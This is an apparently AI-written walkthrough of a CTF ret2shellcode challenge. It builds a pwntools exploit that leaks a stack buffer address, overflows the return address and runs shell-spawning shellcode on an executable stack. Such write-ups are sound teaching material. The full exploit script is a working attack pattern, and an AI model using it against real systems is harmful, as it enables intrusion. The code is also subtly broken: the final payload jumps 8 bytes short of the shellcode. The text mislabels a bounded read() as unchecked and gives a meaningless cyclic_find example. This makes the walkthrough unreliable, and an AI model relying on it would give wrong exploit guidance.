Alright, I've got this pwn challenge to solve, and I need to use Pwntool to do it. Let's see what I've got here.

First, the challenge is an ELF 64-bit LSB executable named "rop." From the security information provided by 'checksec,' I can see that it has partial relro, no canary, no NX, no PIE, no rpath, no runpath, symbols are present, no fortify_source, and some fortify-able functions.

Looking at the decompiled C code, there's a main function that sets up some buffers and calls setvbuf, puts some messages, prints the address of a buffer, and then reads input from standard input into that buffer with a size of 0x400 (1024 bytes).

Okay, so it's a buffer overflow vulnerability since there's no bounds checking on the read function. The NX bit is disabled, which means that I can execute code on the stack. Cool, so I can probably inject some shellcode into the buffer and make it execute.

Now, to solve this using Pwntool, I need to follow these steps:

1. **Understand the binary and the vulnerability:**

   - The binary is a 64-bit ELF executable.

   - It's missing several security features like canary, NX, PIE, etc., which makes exploitation easier.

   - There's a buffer overflow in the main function where it reads input into a buffer of size 0x400 without bounds checking.

2. **Set up the environment:**

   - Install Pwntool if not already installed.

   - Identify the architecture and set up the context in Pwntool.

3. **Find the offset to overwrite the return address:**

   - Since it's a buffer overflow, I need to find out how many bytes to input to overwrite the return address on the stack.

   - I can use pattern creation and pattern offset to find the exact offset.

4. **Craft the payload:**

   - Create a shellcode that I want to execute.

   - Construct the payload with the correct offset, shellcode, and any necessary padding or overwrites.

5. **Exploit the vulnerability:**

   - Send the payload to the binary and trigger the overflow.

   - The shellcode should be executed, giving me a shell or performing some action.

Let's dive into each step in detail.

### Step 1: Understand the binary and the vulnerability

From the provided information:

- **ELF 64-bit LSB executable:** This tells me it's a 64-bit Linux binary.

- **Security features:**

  - **Partial RelRO:** Some parts of the GOT are read-only, but not all.

  - **No Canary:** No stack canaries are used, so no need to bypass them.

  - **No NX:** No execute protection on the stack, so I can execute code on the stack.

  - **No PIE:** No position-independent executable, so addresses are fixed.

  - **Symbols present:** Symbols are not stripped, which might help in identifying functions and addresses.

- **Main function:**

  - Sets up a buffer on the stack.

  - Uses `setvbuf` to set buffering options for standard input.

  - Prints a message and the address of the buffer.

  - Reads input from standard input into the buffer with a size of 0x400 bytes.

Given that NX is disabled, I can execute code on the stack. Since PIE is not enabled, addresses are fixed, which simplifies things.

### Step 2: Set up the environment

First, ensure that Pwntool is installed. If not, install it using pip:

```bash
pip install pwntools
```

Next, set up the context in Pwntool to match the binary's architecture and OS.

Since it's a 64-bit Linux binary, set the context as follows:

```python
from pwn import *

context.update(arch='amd64', os='linux')
```

### Step 3: Find the offset to overwrite the return address

To find the offset at which the return address is overwritten, I can use a unique pattern and then see where it's being overwritten.

Generate a unique pattern of a known length:

```python
pattern = cyclic(1024)
```

Send this pattern to the binary and see at which point it overwrites the return address, causing a crash.

You can run the binary locally and input the pattern, then note the value of the overwritten return address from the crash.

For example, if the binary crashes and the return address is something like 0x6161616161616161, you can find the offset using:

```python
offset = cyclic_find(0x6161616161616161)
print(offset)
```

This will give you the exact offset where the return address starts.

### Step 4: Craft the payload

Once you have the offset, you can craft the payload.

The payload will consist of:

- A string of 'A's to reach the return address.

- The address to jump to (in this case, since NX is disabled, you can jump to the stack where your shellcode is).

- The shellcode itself.

Since symbols are present, you can use Pwntool to find the address of functions or variables.

But in this case, since NX is disabled, and we can execute code on the stack, we don't necessarily need to find specific addresses.

Here's a basic example of how to craft the payload:

```python
# Assuming offset is 24 bytes
offset = 24

# Create a shellcode for a simple shell
shellcode = asm(shellcraft.sh())

# Construct the payload
payload = b'A' * offset  # Padding to reach the return address
payload += p64(0x400607)  # Address to return to, which should be the start of the shellcode on the stack
payload += shellcode

# Send the payload to the binary
p = process('./rop')
p.sendline(payload)
p.interactive()
```

Wait, but in this case, since the stack is executable, I can place the shellcode on the stack and just overwrite the return address to point to the shellcode.

However, in the main function, after reading the input, it returns, so overwriting the return address to point to the buffer where the shellcode is placed should work.

But I need to make sure that the shellcode is placed in the buffer correctly.

Let me think differently.

Given that the buffer is at an address printed by the program, and the read function reads up to 0x400 bytes into it, I can calculate where the return address is relative to the buffer.

But perhaps it's simpler to just find the offset as described earlier.

Assuming the offset is 24 bytes (this is just an example; you need to find the correct offset), and the return address is at offset 24, then:

- Fill the first 24 bytes with 'A's.

- Overwrite the return address with the address of the buffer where the shellcode starts.

- Place the shellcode after the return address.

Wait, but since the buffer is on the stack, and the return address is also on the stack, I need to make sure that the address I'm overwriting the return address with points to the shellcode on the stack.

In this case, since the stack is executable, I can place the shellcode in the buffer and make the return address point to the start of the shellcode.

But I need to know the address of the buffer.

Wait, the program prints the address of the buffer:

```c
printf("What is it : [%p] ?\n", buf);
```

So, I can read this address, calculate the correct address to jump to, and construct the payload accordingly.

This means I need to automate the process of reading the address printed by the program and then calculating the address for the return pointer.

Here's how I can do it:

1. Start the process.

2. Read the output to get the address of the buffer.

3. Calculate the address where the shellcode will be placed in the buffer.

4. Construct the payload with the correct return address pointing to the shellcode.

5. Send the payload to the program.

Let's see this in code.

First, start the process and read the address of the buffer.

Assuming the output is something like:

```
Welcome to CTFHub ret2shellcode!
What is it : [0x7fffffffe4e0] ?
Input something :
```

I need to parse the address from the output.

Here's how to do it in Pwntool:

```python
p = process('./rop')

# Read the welcome message
welcome = p.recvuntil('What is it : [')

# Read the address
addr_str = p.recvuntil('] ?\n', drop=True).decode()
buf_addr = int(addr_str, 16)

# Now, construct the payload
offset = 24  # This needs to be determined correctly
shellcode = asm(shellcraft.sh())
payload = b'A' * offset
payload += p64(buf_addr + offset)  # Return to the shellcode location
payload += shellcode

# Send the payload
p.sendline(payload)
p.interactive()
```

In this example, `offset` is assumed to be 24, but you need to find the correct offset.

Alternatively, if you know the exact stack layout, you can calculate the exact address to jump to.

But to make it more robust, you can use the `cyclic` and `cyclic_find` functions to find the exact offset.

Here's how to find the offset:

1. Generate a unique pattern:

```python
pattern = cyclic(1024)
```

2. Send this pattern to the program and note the value of the overwritten return address when it crashes.

3. Use `cyclic_find` to find the offset:

```python
offset = cyclic_find(overwritten_return_address)
```

For example, if the overwritten return address is `0x6161616161616161`, then:

```python
offset = cyclic_find(0x6161616161616161)
print(offset)
```

This will give you the exact offset.

### Step 5: Exploit the vulnerability

Once you have the correct offset and the address to jump to, construct the payload and send it to the program.

Here's the complete code:

```python
from pwn import *

# Set up the context
context.update(arch='amd64', os='linux')

# Start the process
p = process('./rop')

# Read the welcome message and the address of the buffer
welcome = p.recvuntil('What is it : [')
addr_str = p.recvuntil('] ?\n', drop=True).decode()
buf_addr = int(addr_str, 16)

# Define the offset (this needs to be determined correctly)
offset = 24  # Example offset, replace with the correct one

# Create the shellcode
shellcode = asm(shellcraft.sh())

# Construct the payload
payload = b'A' * offset
payload += p64(buf_addr + offset)  # Return to the shellcode location
payload += shellcode

# Send the payload
p.sendline(payload)

# Interact with the shell
p.interactive()
```

Make sure to replace `offset` with the correct value you found using the cyclic pattern.

This should give you a shell or perform the action defined by your shellcode.
